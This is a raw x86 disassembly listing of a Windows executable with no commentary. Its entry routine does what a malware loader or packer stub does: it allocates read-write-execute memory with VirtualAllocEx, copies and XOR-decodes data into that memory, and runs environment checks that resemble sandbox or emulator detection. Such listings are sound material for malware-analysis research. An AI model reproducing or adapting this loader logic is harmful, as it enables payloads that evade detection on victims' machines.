0x0041aa70:	pushl	%ebp	; from: 0x0041afa2(MAY)
0x0041aa71:	movl	%esp, %ebp
0x0041aa73:	subl	$0xc, %esp
0x0041aa76:	movl	0x8(%ebp), %eax
0x0041aa79:	movl	%eax, -8(%ebp)
0x0041aa7c:	movl	0xc(%ebp), %ecx
0x0041aa7f:	movl	%ecx, -12(%ebp)
0x0041aa82:	movl	$0x22b, -4(%ebp)
0x0041aa89:	movl	-8(%ebp), %edx
0x0041aa8c:	cmpl	-12(%ebp), %edx
0x0041aa8f:	jae	0x0041aa9f	; targets: 0x0041aa9f(MAY), 0x0041aa91(MAY)
0x0041aa91:	movl	$0x22b, -4(%ebp)	; from: 0x0041aa8f(MAY)
0x0041aa98:	movl	-8(%ebp), %eax
0x0041aa9b:	jmp	0x0041aaa9	; targets: 0x0041aaa9(MAY)
0x0041aa9f:	movl	$0x22b, -4(%ebp)	; from: 0x0041aa8f(MAY)
0x0041aaa6:	movl	-12(%ebp), %eax
0x0041aaa9:	movl	%ebp, %esp	; from: 0x0041aa9b(MAY)
0x0041aaab:	popl	%ebp
0x0041aaac:	ret	; targets: 0x0041afa7(MAY)

0x0041aab0:	pushl	%ebp	; from: 0x0041b022(MAY), 0x0041af6f(MAY)
0x0041aab1:	movl	%esp, %ebp
0x0041aab3:	subl	$0xc, %esp
0x0041aab6:	movl	$0x1e4dc, -8(%ebp)
0x0041aabd:	movl	$0x3000, -12(%ebp)
0x0041aac4:	movl	$0x40, -4(%ebp)
0x0041aacb:	movl	-4(%ebp), %eax
0x0041aace:	pushl	%eax
0x0041aacf:	movl	-12(%ebp), %ecx
0x0041aad2:	pushl	%ecx
0x0041aad3:	movl	0x8(%ebp), %edx
0x0041aad6:	pushl	%edx
0x0041aad7:	pushl	$0x0
0x0041aad9:	pushl	$0xffffffff
0x0041aadb:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000060(MAY)
0x0041aae1:	movl	%ebp, %esp
0x0041aae3:	popl	%ebp
0x0041aae4:	ret	; targets: 0x0041af74(MAY)

0x0041aaf0:	pushl	%ebp	; from: 0x0041af84(MAY)
0x0041aaf1:	movl	%esp, %ebp
0x0041aaf3:	popl	%ebp
0x0041aaf4:	ret	; targets: 0x0041af89(MAY)

0x0041ab00:	pushl	%ebp	; from: 0x0041adfa(MAY)
0x0041ab01:	movl	%esp, %ebp
0x0041ab03:	movl	$0x402004, 0x004011cc
0x0041ab0d:	popl	%ebp
0x0041ab0e:	ret	; targets: 0x0041adff(MAY)

0x0041ab10:	pushl	%ebp	; from: 0x0041b007(MAY)
0x0041ab11:	movl	%esp, %ebp
0x0041ab13:	movl	$0x41a820, 0x004011cc
0x0041ab1d:	popl	%ebp
0x0041ab1e:	ret	; targets: 0x0041b00c(MAY)

0x0041ab20:	pushl	%ebp	; from: 0x0041b013(MAY), 0x0041af60(MAY)
0x0041ab21:	movl	%esp, %ebp
0x0041ab23:	movl	0x8(%ebp), %eax
0x0041ab26:	movl	-4(%eax), %eax
0x0041ab29:	popl	%ebp
0x0041ab2a:	ret	; targets: 0x0041b018(MAY), 0x0041af65(MAY)

0x0041abd0:	pushl	%ebp	; from: 0x0041aff1(MAY)
0x0041abd1:	movl	%esp, %ebp
0x0041abd3:	subl	$0x30, %esp
0x0041abd6:	movl	$0x11cb, -8(%ebp)
0x0041abdd:	movl	$0x0, -16(%ebp)
0x0041abe4:	jmp	0x0041abef	; targets: 0x0041abef(MAY)
0x0041abef:	movl	-16(%ebp), %ecx	; from: 0x0041abe4(MAY)
0x0041abf2:	cmpl	0xc(%ebp), %ecx
0x0041abf5:	jae	0x0041acb6	; targets: 0x0041acb6(MAY), 0x0041abfb(MAY)
0x0041abfb:	movl	$0x4189, -8(%ebp)	; from: 0x0041abf5(MAY)
0x0041ac02:	cmpl	$0x0, -16(%ebp)
0x0041ac06:	jne	0x0041ac58	; targets: 0x0041ac08(MAY)
0x0041ac08:	pushl	$0x104	; from: 0x0041ac06(MAY)
0x0041ac0d:	pushl	$0x4011d0
0x0041ac12:	call	GetWindowsDirectoryW@kernel32.dll	; targets: 0xff000030(MAY)
0x0041ac18:	pushl	$0x401000
0x0041ac1d:	pushl	$0x4011d0
0x0041ac22:	call	lstrcatW@kernel32.dll	; targets: 0xff000010(MAY)
0x0041ac28:	pushl	$0x0
0x0041ac2a:	pushl	$0x80
0x0041ac2f:	pushl	$0x3
0x0041ac31:	pushl	$0x0
0x0041ac33:	pushl	$0x3
0x0041ac35:	pushl	$0x1
0x0041ac37:	pushl	$0x4011d0
0x0041ac3c:	call	CreateFileW@kernel32.dll	; targets: 0xff000080(MAY)
0x0041ac42:	movl	%eax, -4(%ebp)
0x0041ac45:	cmpl	$0xffffffff, -4(%ebp)
0x0041ac49:	je	0x0041ac51	; targets: 0x0041ac51(MAY), 0x0041ac4b(MAY)
0x0041ac4b:	cmpl	$0x0, -4(%ebp)	; from: 0x0041ac49(MAY)
0x0041ac4f:	jne	0x0041ac58	; targets: 0x0041ac51(MAY), 0x0041ac58(MAY)
0x0041ac51:	movl	$0x42, %eax	; from: 0x0041ac4f(MAY), 0x0041ac49(MAY)
0x0041ac56:	jmp	0x0041acb6	; targets: 0x0041acb6(MAY)
0x0041ac58:	movl	-16(%ebp), %edx	; from: 0x0041ac4f(MAY)
0x0041ac5b:	addl	$0x563, %edx
0x0041ac61:	movl	%edx, -40(%ebp)
0x0041ac64:	movl	-40(%ebp), %eax
0x0041ac67:	movl	%eax, -36(%ebp)
0x0041ac6a:	movl	-36(%ebp), %ecx
0x0041ac6d:	movl	%ecx, -32(%ebp)
0x0041ac70:	movl	-32(%ebp), %edx
0x0041ac73:	movl	%edx, -28(%ebp)
0x0041ac76:	movl	-28(%ebp), %eax
0x0041ac79:	movl	%eax, -48(%ebp)
0x0041ac7c:	movl	-48(%ebp), %ecx
0x0041ac7f:	movl	%ecx, -20(%ebp)
0x0041ac82:	movl	-16(%ebp), %edx
0x0041ac85:	movl	%edx, -24(%ebp)
0x0041ac88:	movl	0x8(%ebp), %eax
0x0041ac8b:	addl	-16(%ebp), %eax
0x0041ac8e:	movl	%eax, -44(%ebp)
0x0041ac91:	movl	-44(%ebp), %ecx
0x0041ac94:	movl	(%ecx), %edx
0x0041ac96:	addl	-24(%ebp), %edx
0x0041ac99:	movl	-44(%ebp), %eax
0x0041ac9c:	movl	%edx, (%eax)
0x0041ac9e:	movl	0x8(%ebp), %ecx
0x0041aca1:	addl	-16(%ebp), %ecx
0x0041aca4:	movl	(%ecx), %edx
0x0041aca6:	xorl	-20(%ebp), %edx
0x0041acb6:	movl	%ebp, %esp	; from: 0x0041abf5(MAY), 0x0041ac56(MAY)
0x0041acb8:	popl	%ebp
0x0041acb9:	ret	; targets: 0x0041aff6(MAY)

0x0041ad20:	pushl	%ebp	; from: 0x0041af55(MAY)
0x0041ad21:	movl	%esp, %ebp
0x0041ad23:	subl	$0x18, %esp
0x0041ad26:	movl	$0x60, -24(%ebp)
0x0041ad2d:	movl	$0x40102c, -12(%ebp)
0x0041ad34:	leal	-8(%ebp), %eax
0x0041ad37:	pushl	%eax
0x0041ad38:	pushl	$0x5b24
0x0041ad3d:	pushl	$0x3edd
0x0041ad42:	call	DosDateTimeToFileTime@kernel32.dll	; targets: 0xff000070(MAY)
0x0041ad48:	cmpl	$0x1cc364f, -4(%ebp)
0x0041ad4f:	je	0x0041ad56	; targets: 0x0041ad51(MAY), 0x0041ad56(MAY)
0x0041ad51:	call	start	; targets: 0x0041aec0(MAY)	; from: 0x0041ad4f(MAY)
0x0041ad56:	pushl	$0x1	; from: 0x0041ad4f(MAY)
0x0041ad58:	pushl	$0x1
0x0041ad5a:	pushl	$0x1
0x0041ad5c:	pushl	$0x0
0x0041ad5e:	pushl	$0xffffffff
0x0041ad60:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000060(MAY)
0x0041ad66:	movl	$0x42, -24(%ebp)
0x0041ad6d:	movl	RegOpenKeyA@advapi32.dll, %ecx
0x0041ad73:	movl	%ecx, 0x004012d4
0x0041ad79:	movl	$0x6, -24(%ebp)
0x0041ad80:	movl	-12(%ebp), %edx
0x0041ad83:	movb	$0x4f, 0x1(%edx)
0x0041ad87:	leal	-20(%ebp), %eax
0x0041ad8a:	pushl	%eax
0x0041ad8b:	movl	-12(%ebp), %ecx
0x0041ad8e:	pushl	%ecx
0x0041ad8f:	pushl	$0x80000002
0x0041ad94:	call	0x004012d4	; targets: 0xff000050(MAY)
0x0041ad9a:	testl	%eax, %eax
0x0041ad9c:	je	0x0041ada2	; targets: 0x0041ada2(MAY), 0x0041ad9e(MAY)
0x0041ad9e:	xorl	%eax, %eax	; from: 0x0041ad9c(MAY)
0x0041ada0:	jmp	0x0041adff	; targets: 0x0041adff(MAY)
0x0041ada2:	movl	$0x60, -24(%ebp)	; from: 0x0041ad9c(MAY)
0x0041ada9:	leal	-20(%ebp), %edx
0x0041adac:	pushl	%edx
0x0041adad:	pushl	$0x401038
0x0041adb2:	movl	-20(%ebp), %eax
0x0041adb5:	pushl	%eax
0x0041adb6:	call	0x004012d4	; targets: 0xff000050(MAY)
0x0041adbc:	testl	%eax, %eax
0x0041adbe:	je	0x0041adc4	; targets: 0x0041adc0(MAY), 0x0041adc4(MAY)
0x0041adc0:	xorl	%eax, %eax	; from: 0x0041adbe(MAY)
0x0041adc2:	jmp	0x0041adff	; targets: 0x0041adff(MAY)
0x0041adc4:	leal	-20(%ebp), %ecx	; from: 0x0041adbe(MAY)
0x0041adc7:	pushl	%ecx
0x0041adc8:	pushl	$0x401040
0x0041adcd:	movl	-20(%ebp), %edx
0x0041add0:	pushl	%edx
0x0041add1:	call	0x004012d4	; targets: 0xff000050(MAY)
0x0041add7:	testl	%eax, %eax
0x0041add9:	je	0x0041addf	; targets: 0x0041addf(MAY), 0x0041addb(MAY)
0x0041addb:	xorl	%eax, %eax	; from: 0x0041add9(MAY)
0x0041addd:	jmp	0x0041adff	; targets: 0x0041adff(MAY)
0x0041addf:	leal	-20(%ebp), %eax	; from: 0x0041add9(MAY)
0x0041ade2:	pushl	%eax
0x0041ade3:	pushl	$0x40107c
0x0041ade8:	movl	-20(%ebp), %ecx
0x0041adeb:	pushl	%ecx
0x0041adec:	call	0x004012d4	; targets: 0xff000050(MAY)
0x0041adf2:	testl	%eax, %eax
0x0041adf4:	jne	0x0041adfa	; targets: 0x0041adfa(MAY), 0x0041adf6(MAY)
0x0041adf6:	xorl	%eax, %eax	; from: 0x0041adf4(MAY)
0x0041adf8:	jmp	0x0041adff	; targets: 0x0041adff(MAY)
0x0041adfa:	call	0x0041ab00	; targets: 0x0041ab00(MAY)	; from: 0x0041adf4(MAY)
0x0041adff:	movl	%ebp, %esp	; from: 0x0041ada0(MAY), 0x0041ab0e(MAY), 0x0041addd(MAY), 0x0041adf8(MAY), 0x0041adc2(MAY)
0x0041ae01:	popl	%ebp
0x0041ae02:	ret	$0x10	; targets: 0x0041af5a(MAY)

0x0041ae10:	pushl	%ebp	; from: 0x0041afc1(MAY)
0x0041ae11:	movl	%esp, %ebp
0x0041ae13:	subl	$0x12c, %esp
0x0041ae19:	movl	$0x7c, -288(%ebp)
0x0041ae23:	movl	$0x0, -276(%ebp)
0x0041ae2d:	movl	GetWindowsDirectoryA@kernel32.dll, %eax
0x0041ae32:	movl	%eax, -4(%ebp)
0x0041ae35:	pushl	$0x104
0x0041ae3a:	leal	-272(%ebp), %ecx
0x0041ae40:	pushl	%ecx
0x0041ae41:	call	-4(%ebp)	; targets: 0xff000040(MAY)
0x0041ae44:	movl	lstrcatA@kernel32.dll, %edx
0x0041ae4a:	movl	%edx, -292(%ebp)
0x0041ae50:	movl	CreateFileA@kernel32.dll, %eax
0x0041ae55:	movl	%eax, -280(%ebp)
0x0041ae5b:	movl	$0x0, -296(%ebp)
0x0041ae65:	jmp	0x0041ae76	; targets: 0x0041ae76(MAY)
0x0041ae67:	movl	-296(%ebp), %ecx	; from: 0x0041aeb8(MAY)
0x0041ae6d:	addl	$0x1, %ecx
0x0041ae70:	movl	%ecx, -296(%ebp)
0x0041ae76:	movl	-296(%ebp), %edx	; from: 0x0041ae65(MAY)
0x0041ae7c:	cmpl	0x10(%ebp), %edx
0x0041ae7f:	jnl	0x0041aeba	; targets: 0x0041ae81(MAY), 0x0041aeba(MAY)
0x0041ae81:	movl	0xc(%ebp), %eax	; from: 0x0041ae7f(MAY)
0x0041ae84:	addl	-296(%ebp), %eax
0x0041ae8a:	movzbl	(%eax), %ecx
0x0041ae8d:	movl	%ecx, -300(%ebp)
0x0041ae93:	movl	$0x7c, -288(%ebp)
0x0041ae9d:	movl	0x8(%ebp), %edx
0x0041aea0:	addl	-296(%ebp), %edx
0x0041aea6:	movb	-300(%ebp), %al
0x0041aeac:	movb	%al, (%edx)
0x0041aeae:	movl	$0x33, -288(%ebp)
0x0041aeb8:	jmp	0x0041ae67	; targets: 0x0041ae67(MAY)
0x0041aeba:	movl	%ebp, %esp	; from: 0x0041ae7f(MAY)
0x0041aebc:	popl	%ebp
0x0041aebd:	ret	; targets: 0x0041afc6(MAY)


start:
0x0041aec0:	pushl	%ebp	; from: 0x0041ad51(MAY)
0x0041aec1:	movl	%esp, %ebp
0x0041aec3:	subl	$0x70, %esp
0x0041aec6:	movl	%ebp, 0x004012d8
0x0041aecc:	pusha	
0x0041aecd:	movl	$0x0, -60(%ebp)
0x0041aed4:	movl	$0x80000002, -80(%ebp)
0x0041aedb:	movl	$0x0, -20(%ebp)
0x0041aee2:	movl	$0x64, -52(%ebp)
0x0041aee9:	movl	$0xf, -28(%ebp)
0x0041aef0:	movl	$0x0, -60(%ebp)
0x0041aef7:	movl	$0x0, -36(%ebp)
0x0041aefe:	movl	$0x1, -48(%ebp)
0x0041af05:	movl	$0x3, -24(%ebp)
0x0041af0c:	movl	$0x0, -20(%ebp)
0x0041af13:	movl	$0x64, -52(%ebp)
0x0041af1a:	movl	$0xf, -28(%ebp)
0x0041af21:	movl	$0x0, -60(%ebp)
0x0041af28:	movl	$0x0, -36(%ebp)
0x0041af2f:	movl	$0x1, -48(%ebp)
0x0041af36:	movl	$0x3, -24(%ebp)
0x0041af3d:	pushl	$0x104
0x0041af42:	pushl	$0x4011d0
0x0041af47:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000040(MAY)
0x0041af4d:	pushl	$0x37
0x0041af4f:	pushl	$0x37
0x0041af51:	pushl	$0x37
0x0041af53:	pushl	$0x37
0x0041af55:	call	0x0041ad20	; targets: 0x0041ad20(MAY)
0x0041af5a:	movl	0x004011cc, %eax	; from: 0x0041ae02(MAY)
0x0041af5f:	pushl	%eax
0x0041af60:	call	0x0041ab20	; targets: 0x0041ab20(MAY)
0x0041af65:	addl	$0x4, %esp	; from: 0x0041ab2a(MAY)
0x0041af68:	movl	%eax, -64(%ebp)
0x0041af6b:	movl	-64(%ebp), %ecx
0x0041af6e:	pushl	%ecx
0x0041af6f:	call	0x0041aab0	; targets: 0x0041aab0(MAY)
0x0041af74:	addl	$0x4, %esp	; from: 0x0041aae4(MAY)
0x0041af77:	movl	%eax, -56(%ebp)
0x0041af7a:	movl	-64(%ebp), %edx
0x0041af7d:	pushl	%edx
0x0041af7e:	pushl	$0x0
0x0041af80:	movl	-56(%ebp), %eax
0x0041af83:	pushl	%eax
0x0041af84:	call	0x0041aaf0	; targets: 0x0041aaf0(MAY)
0x0041af89:	addl	$0xc, %esp	; from: 0x0041aaf4(MAY)
0x0041af8c:	movl	-64(%ebp), %ecx
0x0041af8f:	movl	%ecx, -72(%ebp)
0x0041af92:	movl	-60(%ebp), %edx	; from: 0x0041afe7(MAY)
0x0041af95:	cmpl	-64(%ebp), %edx
0x0041af98:	jae	0x0041afe9	; targets: 0x0041afe9(MAY), 0x0041af9a(MAY)
0x0041af9a:	movl	-72(%ebp), %eax	; from: 0x0041af98(MAY)
0x0041af9d:	pushl	%eax
0x0041af9e:	movl	-52(%ebp), %ecx
0x0041afa1:	pushl	%ecx
0x0041afa2:	call	0x0041aa70	; targets: 0x0041aa70(MAY)
0x0041afa7:	addl	$0x8, %esp	; from: 0x0041aaac(MAY)
0x0041afaa:	movl	%eax, -76(%ebp)
0x0041afad:	movl	-76(%ebp), %edx
0x0041afb0:	pushl	%edx
0x0041afb1:	movl	0x004011cc, %eax
0x0041afb6:	addl	-36(%ebp), %eax
0x0041afb9:	pushl	%eax
0x0041afba:	movl	-56(%ebp), %ecx
0x0041afbd:	addl	-60(%ebp), %ecx
0x0041afc0:	pushl	%ecx
0x0041afc1:	call	0x0041ae10	; targets: 0x0041ae10(MAY)
0x0041afc6:	addl	$0xc, %esp	; from: 0x0041aebd(MAY)
0x0041afc9:	movl	-28(%ebp), %edx
0x0041afcc:	addl	-52(%ebp), %edx
0x0041afcf:	addl	-36(%ebp), %edx
0x0041afd2:	movl	%edx, -36(%ebp)
0x0041afd5:	movl	-60(%ebp), %eax
0x0041afd8:	addl	-52(%ebp), %eax
0x0041afdb:	movl	%eax, -60(%ebp)
0x0041afde:	movl	-72(%ebp), %ecx
0x0041afe1:	subl	-76(%ebp), %ecx
0x0041afe4:	movl	%ecx, -72(%ebp)
0x0041afe7:	jmp	0x0041af92	; targets: 0x0041af92(MAY)
0x0041afe9:	movl	-64(%ebp), %edx	; from: 0x0041af98(MAY)
0x0041afec:	pushl	%edx
0x0041afed:	movl	-56(%ebp), %eax
0x0041aff0:	pushl	%eax
0x0041aff1:	call	0x0041abd0	; targets: 0x0041abd0(MAY)
0x0041aff6:	addl	$0x8, %esp	; from: 0x0041acb9(MAY)
0x0041aff9:	movl	$0x0, -36(%ebp)
0x0041b000:	movl	$0x0, -96(%ebp)
0x0041b007:	call	0x0041ab10	; targets: 0x0041ab10(MAY)
0x0041b00c:	movl	0x004011cc, %ecx	; from: 0x0041ab1e(MAY)
0x0041b012:	pushl	%ecx
0x0041b013:	call	0x0041ab20	; targets: 0x0041ab20(MAY)
0x0041b018:	addl	$0x4, %esp	; from: 0x0041ab2a(MAY)
0x0041b01b:	movl	%eax, -100(%ebp)
0x0041b01e:	movl	-100(%ebp), %edx
0x0041b021:	pushl	%edx
0x0041b022:	call	0x0041aab0	; targets: 0x0041aab0(MAY)
